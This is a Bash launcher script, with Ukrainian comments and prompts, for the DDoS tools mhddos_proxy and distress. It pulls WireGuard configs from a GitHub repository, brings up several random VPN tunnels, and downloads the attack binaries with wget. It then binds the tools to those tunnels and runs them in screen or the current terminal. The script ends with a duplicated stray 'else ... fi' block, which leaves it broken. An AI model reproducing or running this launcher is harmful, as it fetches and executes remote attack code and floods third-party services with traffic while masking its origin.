#!/bin/bash

MODULE_DIR="modules"
WG_DIR="/etc/wireguard"
TMP_DIR="/tmp/wg-configs"
WG_REPO="https://github.com/k7771/config"
WG_SUBDIR="WG"

#=== Оновлення WireGuard конфігів ===
echo "[+] Завантаження WG-конфігів з репозиторію..."
sudo rm -rf "$TMP_DIR"
git clone --depth=1 "$WG_REPO" "$TMP_DIR" >/dev/null 2>&1

if [ -d "$TMP_DIR/$WG_SUBDIR" ]; then
    sudo cp "$TMP_DIR/$WG_SUBDIR"/*.conf "$WG_DIR"/
    sudo chmod 600 "$WG_DIR"/*.conf
    echo "[+] Конфіги скопійовані до $WG_DIR"
else
    echo "[-] Папка $WG_SUBDIR не знайдена у репозиторії"
fi

rm -rf "$TMP_DIR"

mkdir -p "$MODULE_DIR"

#=== Завантаження модулів ===
echo "[+] Перевірка наявності модулів..."
[ -f "$MODULE_DIR/mhddos_proxy" ] || wget -qO "$MODULE_DIR/mhddos_proxy" https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux
[ -f "$MODULE_DIR/distress" ] || wget -qO "$MODULE_DIR/distress" https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl

#=== Рандомний вибір WG-конфігів і запуск ===
echo "[+] Пошук WireGuard конфігів у $WG_DIR..."
WG_FILES=($(find "$WG_DIR" -name "*.conf" -type f | shuf | head -n 5))
WG_IFACES=()

for conf in "${WG_FILES[@]}"; do
    sudo wg-quick down "$conf" 2>/dev/null
    sudo wg-quick up "$conf" || echo "[-] Не вдалося підключити $conf"
    iface=$(basename "$conf" .conf)
    WG_IFACES+=("$iface")
done

#=== Вибір модуля ===
echo "[1] mhddos_proxy"
echo "[2] distress"
read -p "[?] Виберіть модуль (1/2): " module_choice
case $module_choice in
    1)
        MODULE="$MODULE_DIR/mhddos_proxy"
        CONFIG_FILE="$MODULE_DIR/mhddos.ini"
        MODULE_NAME="mhddos"
        ;;
    2)
        MODULE="$MODULE_DIR/distress"
        CONFIG_FILE="$MODULE_DIR/distress.ini"
        MODULE_NAME="distress"
        ;;
    *)
        echo "[-] Невірний вибір модуля"
        exit 1
        ;;
esac

#=== Додавання WG-інтерфейсів до конфігів ===
if [[ "$module_choice" == "1" ]]; then
    echo "[+] Додавання WireGuard інтерфейсів до mhddos.ini..."
    grep -v "^--ifaces" "$CONFIG_FILE" 2>/dev/null > "$CONFIG_FILE.tmp" || touch "$CONFIG_FILE.tmp"
    echo -n "--ifaces " >> "$CONFIG_FILE.tmp"
    echo "${WG_IFACES[*]}" >> "$CONFIG_FILE.tmp"
    mv "$CONFIG_FILE.tmp" "$CONFIG_FILE"
elif [[ "$module_choice" == "2" ]]; then
    echo "[+] Додавання WireGuard інтерфейсів до distress.ini..."
    grep -v "^--interface" "$CONFIG_FILE" 2>/dev/null > "$CONFIG_FILE.tmp" || touch "$CONFIG_FILE.tmp"
    echo -n "--interface " >> "$CONFIG_FILE.tmp"
    echo "${WG_IFACES[*]}" | tr ' ' ',' >> "$CONFIG_FILE.tmp"
    mv "$CONFIG_FILE.tmp" "$CONFIG_FILE"
fi

#=== Налаштування параметрів модуля ===
echo "[+] Поточні параметри ($CONFIG_FILE):"
cat "$CONFIG_FILE"
echo "[?] Хочете змінити параметри? (y/n):"
read -r edit_ans
if [[ $edit_ans == "y" ]]; then
    echo "[+] Введіть нові параметри:"
    read -r new_args
    echo "$new_args" > "$CONFIG_FILE"
    if [[ "$module_choice" == "1" ]]; then
        echo -n "--ifaces ${WG_IFACES[*]}" >> "$CONFIG_FILE"
    elif [[ "$module_choice" == "2" ]]; then
        echo -n "--interface " >> "$CONFIG_FILE"
        echo "${WG_IFACES[*]}" | tr ' ' ',' >> "$CONFIG_FILE"
    fi
fi

#=== Вибір способу запуску ===
echo "[?] Виберіть спосіб запуску:"
echo "1 - screen у фоні"
echo "2 - screen з виводом"
echo "3 - без screen у поточному терміналі"
read -p "[1/2/3]: " run_mode

ARGS=$(cat "$CONFIG_FILE")

if [[ $run_mode == "1" ]]; then
    screen -dmS "$MODULE_NAME" $MODULE $ARGS
    echo "[+] $MODULE_NAME запущено у screen (фон)."
elif [[ $run_mode == "2" ]]; then
    echo "[+] Запуск $MODULE_NAME у screen з виводом..."
    screen -S "$MODULE_NAME" $MODULE $ARGS
elif [[ $run_mode == "3" ]]; then
    echo "[+] Запуск $MODULE_NAME без screen у цьому терміналі..."
    $MODULE $ARGS
else
    echo "[-] Невірний вибір запуску."
    exit 1
fi

else
    echo "[-] Невірний вибір запуску."
    exit 1
fi
